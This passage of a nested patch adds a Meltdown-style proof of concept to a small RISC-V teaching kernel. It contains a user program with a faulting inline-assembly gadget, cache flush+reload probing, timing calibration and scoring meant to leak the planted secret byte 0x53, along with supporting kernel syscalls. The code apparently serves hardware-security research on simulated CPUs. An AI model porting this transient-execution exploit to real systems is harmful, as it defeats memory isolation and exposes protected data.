++    } else if ((scause == SCAUSE_LOAD_PAGE_FAULT || scause == SCAUSE_LOAD_ACCESS_FAULT) &&
++               p->meltdown_recover_epc != 0) {
 +        p->tf->epc = p->meltdown_recover_epc;
 +        p->meltdown_recover_epc = 0;
      } else if (is_page_fault(scause)) {
@@ -171,7 +776,7 @@ diff -ruN minios/trap.c minios/trap.c
              setkilled(p);
 diff -ruN minios/user/init.c minios/user/init.c
 --- minios/user/init.c	2026-07-08 16:58:30.599486000 +0800
-+++ minios/user/init.c	2026-07-08 19:26:19.304199666 +0800
++++ minios/user/init.c	2026-07-08 20:05:31.707274006 +0800
 @@ -4,6 +4,29 @@
  
  int main(void) {
@@ -204,16 +809,150 @@ diff -ruN minios/user/init.c minios/user/init.c
  
 diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 --- minios/user/meltdown_us.c	1970-01-01 08:00:00.000000000 +0800
-+++ minios/user/meltdown_us.c	2026-07-08 19:33:46.793735622 +0800
-@@ -0,0 +1,64 @@
++++ minios/user/meltdown_us.c	2026-07-09 01:06:59.781359079 +0800
+@@ -0,0 +1,376 @@
 +#include "user.h"
 +
-+#define PROBE_STRIDE 64
++#ifndef MELTDOWN_US_PROBE_STRIDE
++#define MELTDOWN_US_PROBE_STRIDE 64
++#endif
++#define PROBE_STRIDE MELTDOWN_US_PROBE_STRIDE
++#if PROBE_STRIDE == 64
++#define PROBE_SHIFT 6
++#elif PROBE_STRIDE == 128
++#define PROBE_SHIFT 7
++#elif PROBE_STRIDE == 256
++#define PROBE_SHIFT 8
++#elif PROBE_STRIDE == 512
++#define PROBE_SHIFT 9
++#elif PROBE_STRIDE == 1024
++#define PROBE_SHIFT 10
++#elif PROBE_STRIDE == 2048
++#define PROBE_SHIFT 11
++#elif PROBE_STRIDE == 4096
++#define PROBE_SHIFT 12
++#else
++#error "MELTDOWN_US_PROBE_STRIDE must be a supported power of two"
++#endif
 +#define PROBE_VALUES 256
 +#define PROBE_BYTES (PROBE_VALUES * PROBE_STRIDE)
-+#define ATTEMPTS 8
++#ifndef MELTDOWN_US_ATTEMPTS
++#define MELTDOWN_US_ATTEMPTS 16
++#endif
++#define L1_SETS 64
++#define L1_WAYS 4
++#define L1_SET_SPAN_BYTES (L1_SETS * PROBE_STRIDE)
++#define L1_SIZE_BYTES (L1_SET_SPAN_BYTES * L1_WAYS)
++#define EVICTION_MULTIPLIER 4
++#define EVICTION_BYTES (5 * L1_SIZE_BYTES)
++#define DEFAULT_THRESHOLD 80
++#ifndef MELTDOWN_US_TIMING
++#define MELTDOWN_US_TIMING 0
++#endif
++#ifndef MELTDOWN_US_DEBUG_TIMES
++#define MELTDOWN_US_DEBUG_TIMES 0
++#endif
++#ifndef MELTDOWN_US_DEBUG_ONLY
++#define MELTDOWN_US_DEBUG_ONLY 0
++#endif
++#ifndef MELTDOWN_US_GADGET_DELAY
++#define MELTDOWN_US_GADGET_DELAY 0
++#endif
++#ifndef MELTDOWN_US_GADGET_VARIANT
++#define MELTDOWN_US_GADGET_VARIANT 0
++#endif
++#ifndef MELTDOWN_US_TRAIN_USER_ACCESS
++#define MELTDOWN_US_TRAIN_USER_ACCESS 0
++#endif
++#ifndef MELTDOWN_US_DEBUG_RESIDENCY
++#define MELTDOWN_US_DEBUG_RESIDENCY 0
++#endif
++#ifndef MELTDOWN_US_PRELOAD_ON_CLEAR
++#define MELTDOWN_US_PRELOAD_ON_CLEAR 0
++#endif
++#ifndef MELTDOWN_US_TRAIN_ALIAS
++#define MELTDOWN_US_TRAIN_ALIAS 0
++#endif
++#ifndef MELTDOWN_US_PMP_FAULT
++#define MELTDOWN_US_PMP_FAULT 0
++#endif
++#define GADGET_DELAY4 \
++    "addi t2, t2, 1\n" \
++    "xori t3, t3, 3\n" \
++    "add  t4, t4, t2\n" \
++    "xor  t5, t5, t3\n"
++#if MELTDOWN_US_GADGET_DELAY == 0
++#define GADGET_DELAY_ASM ""
++#elif MELTDOWN_US_GADGET_DELAY == 4
++#define GADGET_DELAY_ASM GADGET_DELAY4
++#elif MELTDOWN_US_GADGET_DELAY == 8
++#define GADGET_DELAY_ASM GADGET_DELAY4 GADGET_DELAY4
++#elif MELTDOWN_US_GADGET_DELAY == 16
++#define GADGET_DELAY_ASM GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4
++#elif MELTDOWN_US_GADGET_DELAY == 32
++#define GADGET_DELAY_ASM GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4 GADGET_DELAY4
++#else
++#error "MELTDOWN_US_GADGET_DELAY must be one of 0, 4, 8, 16, 32"
++#endif
 +
 +static unsigned char* probe;
++static unsigned long* probe_ptrs;
++static volatile unsigned char training_sink;
++
++static inline void fence_all(void) {
++    asm volatile("fence rw, rw" ::: "memory");
++}
++
++#if MELTDOWN_US_TIMING && MELTDOWN_US_DEBUG_RESIDENCY
++static void print_residency(const char* tag, int attempt) {
++    unsigned long packed = meltdown_residency(probe);
++    int secret_time = (int)((packed >> 32) & 0xffffUL);
++    int probe53_time = (int)((packed >> 16) & 0xffffUL);
++    int probe0_time = (int)(packed & 0xffffUL);
++
++    printf("meltdown-us: residency %s attempt=%d secret=%d p53=%d p0=%d\n",
++           tag, attempt, secret_time, probe53_time, probe0_time);
++}
++#endif
++#if MELTDOWN_US_TIMING
++static unsigned long calibrate_threshold(void) {
++    unsigned long packed = meltdown_calibrate(probe);
++    unsigned long hit = packed >> 32;
++    unsigned long miss = packed & 0xffffffffUL;
++    unsigned long threshold = (hit + miss) / 2;
++
++    printf("meltdown-us: timing hit=%d miss=%d threshold=%d\n",
++           (int)hit, (int)miss, (int)threshold);
++    if (threshold == 0) {
++        return DEFAULT_THRESHOLD;
++    }
++    return threshold;
++}
++
++#if !MELTDOWN_US_DEBUG_ONLY
++static void top_two(unsigned int hits[PROBE_VALUES],
++                    int* best,
++                    unsigned int* best_score,
++                    int* second,
++                    unsigned int* second_score) {
++    *best = 0;
++    *second = 0;
++    *best_score = 0;
++    *second_score = 0;
++    for (int i = 0; i < PROBE_VALUES; i = i + 1) {
++        if (hits[i] > *best_score) {
++            *second = *best;
++            *second_score = *best_score;
++            *best = i;
++            *best_score = hits[i];
++        } else if (hits[i] > *second_score) {
++            *second = i;
++            *second_score = hits[i];
++        }
++    }
++}
++#endif
++#endif
 +
 +__attribute__((noinline)) static void run_faulting_gadget(unsigned long secret_va) {
 +    unsigned long recover_pc;
@@ -228,66 +967,287 @@ diff -ruN minios/user/meltdown_us.c minios/user/meltdown_us.c
 +    asm volatile(
 +        ".align 2\n"
 +        "meltdown_us_fault_label:\n"
-+        "fence rw, rw\n"
-+        "lb   t0, 0(%0)\n"
-+        "slli t0, t0, 6\n"
++#if MELTDOWN_US_GADGET_VARIANT == 0
++        "lbu  t0, 0(%0)\n"
++        "li   t2, 0x11\n"
++        "li   t3, 0x23\n"
++        "li   t4, 0x35\n"
++        "li   t5, 0x47\n"
++        GADGET_DELAY_ASM
++        "andi t0, t0, 0xff\n"
++        "slli t0, t0, %2\n"
 +        "add  t0, t0, %1\n"
-+        "ld   zero, 0(t0)\n"
++        "lb   t1, 0(t0)\n"
++#elif MELTDOWN_US_GADGET_VARIANT == 1
++        "lbu  t0, 0(%0)\n"
++        "li   t2, 0x11\n"
++        "li   t3, 0x23\n"
++        "li   t4, 0x35\n"
++        "li   t5, 0x47\n"
++        GADGET_DELAY_ASM
++        "andi t0, t0, 0xff\n"
++        "slli t0, t0, 3\n"
++        "add  t0, t0, %3\n"
++        "ld   t0, 0(t0)\n"
++        "lb   t1, 0(t0)\n"
++#else
++#error "MELTDOWN_US_GADGET_VARIANT must be 0 or 1"
++#endif
 +        "meltdown_us_recover_label:\n"
 +        "nop\n"
 +        :
-+        : "r"(secret_va), "r"(probe)
-+        : "t0", "memory");
++        : "r"(secret_va), "r"(probe), "i"(PROBE_SHIFT), "r"(probe_ptrs)
++        : "t0", "t1", "t2", "t3", "t4", "t5", "memory");
 +}
 +
 +int main(void) {
++#if MELTDOWN_US_TIMING
++    printf("meltdown-us: main begin\n");
++#endif
 +    unsigned long secret_va = meltdown_setup();
++#if MELTDOWN_US_TRAIN_ALIAS
++    unsigned long alias_va = 0;
++#endif
 +    unsigned char* mem;
++#if MELTDOWN_US_TIMING
++#if !MELTDOWN_US_DEBUG_ONLY
++    unsigned int hits[PROBE_VALUES];
++#endif
++#endif
 +
 +    if (secret_va == (unsigned long)-1) {
 +        printf("meltdown-us: setup failed\n");
 +        exit(1);
 +    }
++#if MELTDOWN_US_TRAIN_ALIAS
++    alias_va = meltdown_alias();
++    if (alias_va == (unsigned long)-1 || alias_va == 0) {
++        printf("meltdown-us: alias failed\n");
++        exit(1);
++    }
++#endif
 +
-+    mem = sbrk(PROBE_BYTES + 128);
++    mem = sbrk(PROBE_BYTES + 128 + (PROBE_VALUES * sizeof(unsigned long)) + 64);
 +    if (mem == (void*)-1) {
 +        printf("meltdown-us: sbrk failed\n");
 +        exit(1);
 +    }
 +    probe = (unsigned char*)(((unsigned long)mem + 63) & ~63UL);
++    probe_ptrs = (unsigned long*)(((unsigned long)(probe + PROBE_BYTES) + 7) & ~7UL);
 +
 +    for (unsigned long i = 0; i < PROBE_BYTES; i = i + PROBE_STRIDE) {
 +        probe[i] = (unsigned char)i;
 +    }
++    for (int i = 0; i < PROBE_VALUES; i = i + 1) {
++        probe_ptrs[i] = (unsigned long)(probe + ((unsigned long)i * PROBE_STRIDE));
++    }
++#if MELTDOWN_US_TIMING
++#if !MELTDOWN_US_DEBUG_ONLY
++    for (int i = 0; i < PROBE_VALUES; i = i + 1) {
++        hits[i] = 0;
++    }
++#endif
++#endif
 +
-+    printf("meltdown-us: secret_va=0x%x attempts=%d\n", (unsigned int)secret_va, ATTEMPTS);
++    printf("meltdown-us: secret_va=0x%x attempts=%d\n", (unsigned int)secret_va, MELTDOWN_US_ATTEMPTS);
++#if MELTDOWN_US_PMP_FAULT
++    printf("meltdown-us: fault_mode=pmp-access\n");
++#else
++    printf("meltdown-us: fault_mode=page-permission\n");
++#endif
 +
-+    for (int attempt = 0; attempt < ATTEMPTS; attempt = attempt + 1) {
++#if MELTDOWN_US_TIMING
++#if !MELTDOWN_US_DEBUG_ONLY
++    unsigned long threshold = calibrate_threshold();
++#else
++    calibrate_threshold();
++#endif
++#endif
++    for (int attempt = 0; attempt < MELTDOWN_US_ATTEMPTS; attempt = attempt + 1) {
++#if MELTDOWN_US_TIMING
++        if (meltdown_flush_probe(probe) < 0) {
++            printf("meltdown-us: flush probe failed\n");
++            exit(1);
++        }
++        fence_all();
++#endif
++#if MELTDOWN_US_TRAIN_ALIAS
++        training_sink = training_sink ^ *(volatile unsigned char*)alias_va;
++        fence_all();
++        if (attempt == 0) {
++            printf("meltdown-us: alias_va=0x%x training value=0x%x\n",
++                   (unsigned int)alias_va, (unsigned int)training_sink);
++        }
++#endif
++#if MELTDOWN_US_PMP_FAULT
++        training_sink = training_sink ^ *(volatile unsigned char*)secret_va;
++        fence_all();
++        if (attempt == 0) {
++            printf("meltdown-us: pmp training value=0x%x\n", (unsigned int)training_sink);
++        }
++        if (meltdown_pmp_secret(1) < 0) {
++            printf("meltdown-us: pmp deny failed\n");
++            exit(1);
++        }
++        fence_all();
++        if (attempt == 0) {
++            printf("meltdown-us: pmp deny armed\n");
++        }
++#endif
++#if MELTDOWN_US_TRAIN_USER_ACCESS
++        if (meltdown_set_secret_user(1) < 0) {
++            printf("meltdown-us: set secret user failed\n");
++            exit(1);
++        }
++        training_sink = training_sink ^ *(volatile unsigned char*)secret_va;
++        fence_all();
++#if MELTDOWN_US_PRELOAD_ON_CLEAR
++        if (meltdown_set_secret_user(2) < 0) {
++#else
++        if (meltdown_set_secret_user(0) < 0) {
++#endif
++            printf("meltdown-us: clear secret user failed\n");
++            exit(1);
++        }
++        fence_all();
++        if (attempt == 0) {
++            printf("meltdown-us: training value=0x%x\n", (unsigned int)training_sink);
++        }
++#endif
++#if MELTDOWN_US_TIMING && MELTDOWN_US_DEBUG_RESIDENCY
++        print_residency("pre", attempt);
++#endif
 +        run_faulting_gadget(secret_va);
++#if MELTDOWN_US_PMP_FAULT
++        if (meltdown_pmp_secret(0) < 0) {
++            printf("meltdown-us: pmp clear failed\n");
++            exit(1);
++        }
++        fence_all();
++#endif
++#if MELTDOWN_US_TIMING
++#if MELTDOWN_US_DEBUG_RESIDENCY
++        print_residency("post", attempt);
++#endif
++#if MELTDOWN_US_DEBUG_TIMES
++        int raw53 = (int)meltdown_probe_time_one(probe, 0x53);
++        int raw00 = (int)meltdown_probe_time_one(probe, 0x00);
++        int raw80 = (int)meltdown_probe_time_one(probe, 0x80);
++        int raw01 = (int)meltdown_probe_time_one(probe, 0x01);
++        int raw55 = (int)meltdown_probe_time_one(probe, 0x55);
++        int raw51 = (int)meltdown_probe_time_one(probe, 0x51);
++        int raw56 = (int)meltdown_probe_time_one(probe, 0x56);
++        int raw50 = (int)meltdown_probe_time_one(probe, 0x50);
++        int raw54 = (int)meltdown_probe_time_one(probe, 0x54);
++        int raw52 = (int)meltdown_probe_time_one(probe, 0x52);
++        printf("meltdown-us: raw attempt=%d i53=%d i0=%d i80=%d i1=%d i55=%d i51=%d i56=%d i50=%d i54=%d i52=%d\n",
++               attempt,
++               raw53, raw00, raw80, raw01, raw55, raw51, raw56, raw50, raw54, raw52);
++#if MELTDOWN_US_DEBUG_ONLY
++        continue;
++#endif
++#endif
++#if !MELTDOWN_US_DEBUG_ONLY
++        unsigned int round_hits[PROBE_VALUES];
++        if (meltdown_probe(probe, threshold, round_hits) < 0) {
++            printf("meltdown-us: probe failed\n");
++            exit(1);
++        }
++        for (int i = 0; i < PROBE_VALUES; i = i + 1) {
++            hits[i] = hits[i] + round_hits[i];
++        }
++#endif
++#endif
 +    }
 +
++#if MELTDOWN_US_TIMING
++#if MELTDOWN_US_DEBUG_ONLY
 +    printf("meltdown-us: fault recovery ok\n");
++    printf("meltdown-us: debug-only done secret=0x53\n");
++#else
++    int best;
++    int second;
++    unsigned int best_score;
++    unsigned int second_score;
++    top_two(hits, &best, &best_score, &second, &second_score);
++
++    printf("meltdown-us: fault recovery ok\n");
++    printf("meltdown-us: score best=0x%x/%d second=0x%x/%d secret=0x53\n",
++           best, best_score, second, second_score);
++    if (best == 0x53) {
++        printf("meltdown-us: leak candidate ok\n");
++    } else {
++        printf("meltdown-us: leak candidate miss\n");
++    }
++#endif
++#else
++    printf("meltdown-us: fault recovery ok\n");
++#endif
 +    printf("meltdown-us: done\n");
++    meltdown_done(0);
 +    exit(0);
 +}
 diff -ruN minios/user/user.h minios/user/user.h
 --- minios/user/user.h	2026-07-08 16:58:30.600537000 +0800
-+++ minios/user/user.h	2026-07-08 19:26:16.737190855 +0800
-@@ -41,6 +41,8 @@
++++ minios/user/user.h	2026-07-09 00:41:32.284116151 +0800
+@@ -41,6 +41,17 @@
  int getcwd(char* buf, int max);
  int unlink(const char* path);
  int getprocinfo(struct procinfo* info);
 +unsigned long meltdown_setup(void);
 +int meltdown_arm(void* recover_pc);
++int meltdown_done(int code);
++int meltdown_probe(void* probe, unsigned long threshold, void* hits);
++unsigned long meltdown_calibrate(void* probe);
++int meltdown_flush_probe(void* probe);
++unsigned long meltdown_probe_time_one(void* probe, int index);
++int meltdown_set_secret_user(int user);
++unsigned long meltdown_residency(void* probe);
++unsigned long meltdown_alias(void);
++int meltdown_pmp_secret(int deny);
  void* mmap(void* addr, unsigned long length, int prot, int flags, int fd, unsigned long offset);
  int munmap(void* addr, unsigned long length);
  int mprotect(void* addr, unsigned long length, int prot);
 diff -ruN minios/user/usys.S minios/user/usys.S
 --- minios/user/usys.S	2026-07-08 16:58:30.600704000 +0800
-+++ minios/user/usys.S	2026-07-08 19:26:17.247192605 +0800
-@@ -31,3 +31,5 @@
++++ minios/user/usys.S	2026-07-09 00:41:38.539137621 +0800
+@@ -31,3 +31,14 @@
  SYSCALL mremap, SYS_mremap
  SYSCALL mkdir, SYS_mkdir
  SYSCALL getprocinfo, SYS_getprocinfo
 +SYSCALL meltdown_setup, SYS_meltdown_setup
 +SYSCALL meltdown_arm, SYS_meltdown_arm
++SYSCALL meltdown_done, SYS_meltdown_done
++SYSCALL meltdown_probe, SYS_meltdown_probe
++SYSCALL meltdown_calibrate, SYS_meltdown_calibrate
++SYSCALL meltdown_flush_probe, SYS_meltdown_flush_probe
++SYSCALL meltdown_probe_time_one, SYS_meltdown_probe_time_one
++SYSCALL meltdown_set_secret_user, SYS_meltdown_set_secret_user
++SYSCALL meltdown_residency, SYS_meltdown_residency
++SYSCALL meltdown_alias, SYS_meltdown_alias
++SYSCALL meltdown_pmp_secret, SYS_meltdown_pmp_secret
+diff -ruN minios/vm.c minios/vm.c
+--- minios/vm.c	2026-07-08 16:57:35.281314000 +0800
++++ minios/vm.c	2026-07-08 20:12:07.332631945 +0800
+@@ -14,6 +14,10 @@
+ #define QEMU_VIRT_UART0 0x10000000UL
+ #endif
+ 
++#ifdef PLATFORM_SPIKE
++#define SPIKE_CLINT 0x02000000UL
++#endif
++
+ #ifdef PLATFORM_XIANGSHAN
+ #define XIANGSHAN_CLINT 0x38000000UL
+ #define XIANGSHAN_UARTLITE 0x40600000UL
+@@ -61,6 +65,10 @@
+     kvmmap(kpgtbl, QEMU_VIRT_UART0, QEMU_VIRT_UART0, PGSIZE, RISCV_PTE_R | RISCV_PTE_W);
+     #endif
+ 
++    #ifdef PLATFORM_SPIKE
++    kvmmap(kpgtbl, SPIKE_CLINT, SPIKE_CLINT, 16 * PGSIZE, RISCV_PTE_R | RISCV_PTE_W);
++    #endif
++
+     #ifdef PLATFORM_XIANGSHAN
+     kvmmap(kpgtbl, XIANGSHAN_CLINT, XIANGSHAN_CLINT, 16 * PGSIZE, RISCV_PTE_R | RISCV_PTE_W);
+     kvmmap(kpgtbl, XIANGSHAN_UARTLITE, XIANGSHAN_UARTLITE, PGSIZE, RISCV_PTE_R | RISCV_PTE_W);
